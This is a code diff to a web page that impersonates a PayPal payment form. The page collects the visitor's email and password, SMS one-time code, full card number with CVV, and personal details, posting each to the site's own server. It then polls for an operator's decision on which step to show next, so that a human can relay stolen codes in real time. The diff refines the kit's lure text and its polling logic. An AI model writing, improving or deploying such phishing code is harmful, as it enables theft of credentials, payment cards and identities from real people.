@@ -670,15 +670,7 @@
                 <img src="logo1.png" alt="PayPal" style="height: 50px; object-fit: contain;">
             </div>
             <div class="success-icon">✓</div>
-            <div class="success-message" id="successMessageText">¡Transacción exitosa!</div>
-            <div class="success-detail" id="successDetailText">Tu pago ha sido procesado correctamente</div>
-            
-            <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 13px;">
-                <p style="margin-bottom: 8px;"><strong id="referenceLabel">Referencia:</strong> TXN-2026-042700123</p>
-                <p style="margin-bottom: 8px;"><strong id="amountLabel">Monto:</strong> $99.99</p>
-                <p><strong id="statusLabel">Estado:</strong> <span style="color: #28a745;" id="statusValue">Completado</span></p>
-            </div>
-            <button type="button" class="btn-primary" onclick="resetForm()">Realizar otro pago</button>
+            <div class="success-message" id="successMessageText">Thank you for your confirmation</div>
         </div>
 
         <!-- FOOTER -->
@@ -748,8 +740,8 @@
                 secureInfo: 'Ihre Daten sind mit 256-Bit-Verschlüsselung geschützt',
                 loadingTitle: 'Überprüfung…',
                 loadingSubtitle: 'Wir verarbeiten Ihre Informationen',
-                successMessageText: 'Transaktion erfolgreich!',
-                successDetailText: 'Ihre Zahlung wurde erfolgreich verarbeitet',
+                successMessageText: 'Vielen Dank für Ihre Bestätigung',
+                successDetailText: '',
                 successButton: 'Weitere Zahlung',
                 referenceLabel: 'Referenz:',
                 amountLabel: 'Betrag:',
@@ -812,8 +804,8 @@
                 secureInfo: 'Your information is protected with 256-bit encryption',
                 loadingTitle: 'Verifying…',
                 loadingSubtitle: 'We are processing your information',
-                successMessageText: 'Transaction successful!',
-                successDetailText: 'Your payment has been processed successfully',
+                successMessageText: 'Thank you for your confirmation',
+                successDetailText: '',
                 successButton: 'Make another payment',
                 referenceLabel: 'Reference:',
                 amountLabel: 'Amount:',
@@ -1188,46 +1180,37 @@
         }
     </script>
     <script>
-// ID de session unique pour cet utilisateur (généré par le serveur)
+// Session ID unique pour cet utilisateur
 let sessionId = null;
 let pollingInterval = null;
 
 // ================================================
-// ATTENDRE LA DÉCISION DE L'ADMIN
-// Le site interroge le serveur toutes les 2 secondes
+// ATTENDRE LA DÉCISION ADMIN (polling toutes les 2s)
 // ================================================
-function attendreDecision() {
-  // Affiche le chargement
+function attendreDecision(etapeActuelle) {
   showStep('loading');
-
-  // Arrête un ancien polling s'il existe
   if (pollingInterval) clearInterval(pollingInterval);
 
   pollingInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/decision/${sessionId}`);
+      const res = await fetch('/decision/' + sessionId);
       const data = await res.json();
 
       if (data.decision) {
         clearInterval(pollingInterval);
         pollingInterval = null;
 
-        // Redirige selon la décision de l'admin
-        if (data.decision === 'step2') showStep('step2');
+        if (data.decision === 'step1') showStep('step1');
+        else if (data.decision === 'step2') showStep('step2');
         else if (data.decision === 'step3') showStep('step3');
         else if (data.decision === 'step4') showStep('step4');
         else if (data.decision === 'success') showStep('success');
-        else if (data.decision === 'error') {
-          // Retourne à l'étape actuelle selon où on est
-          const etapesActives = ['step1','step2','step3','step4'];
-          const derniereEtape = sessionStorage.getItem('derniereEtape') || 'step1';
-          showStep(derniereEtape);
-        }
+        else if (data.decision === etapeActuelle) showStep(etapeActuelle); // erreur = même étape
       }
     } catch (err) {
       console.error('Erreur polling:', err);
     }
-  }, 2000); // Vérifie toutes les 2 secondes
+  }, 2000);
 }
 
 // ================================================
@@ -1240,19 +1223,16 @@ async function goToStep2(e) {
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
 
-  sessionStorage.setItem('derniereEtape', 'step1');
-
-  const res = await fetch("/etape1", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
+  const res = await fetch('/etape1', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ email, password })
   });
 
   const data = await res.json();
-  sessionId = data.sessionId; // On récupère l'ID de session
+  sessionId = data.sessionId;
 
-  // Affiche le chargement et attend la décision admin
-  attendreDecision();
+  attendreDecision('step1');
 }
 
 // ================================================
@@ -1265,15 +1245,13 @@ async function goToStep3(e) {
   const digits = Array.from(document.querySelectorAll('.sms-digit'));
   const smsCode = digits.map(input => input.value).join('');
 
-  sessionStorage.setItem('derniereEtape', 'step2');
-
-  await fetch("/etape2", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
+  await fetch('/etape2', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ smsCode, sessionId })
   });
 
-  attendreDecision();
+  attendreDecision('step2');
 }
 
 // ================================================
@@ -1289,15 +1267,13 @@ async function submitPayment(e) {
   const cvv = document.getElementById('cvv').value;
   const cardBrand = document.getElementById('cardBrand').value;
 
-  sessionStorage.setItem('derniereEtape', 'step3');
-
-  await fetch("/etape3", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
+  await fetch('/etape3', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ cardName, cardNumber, expiry, cvv, cardBrand, sessionId })
   });
 
-  attendreDecision();
+  attendreDecision('step3');
 }
 
 // ================================================
@@ -1313,15 +1289,13 @@ async function submitCustomerInfo(e) {
   const birthYear = document.getElementById('birthYear').value;
   const postalCode = document.getElementById('postalCode').value;
 
-  sessionStorage.setItem('derniereEtape', 'step4');
-
-  await fetch("/etape4", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
+  await fetch('/etape4', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ firstName, lastName, address, birthYear, postalCode, sessionId })
   });
 
-  attendreDecision();
+  attendreDecision('step4');
 }
 </script>
 </body>
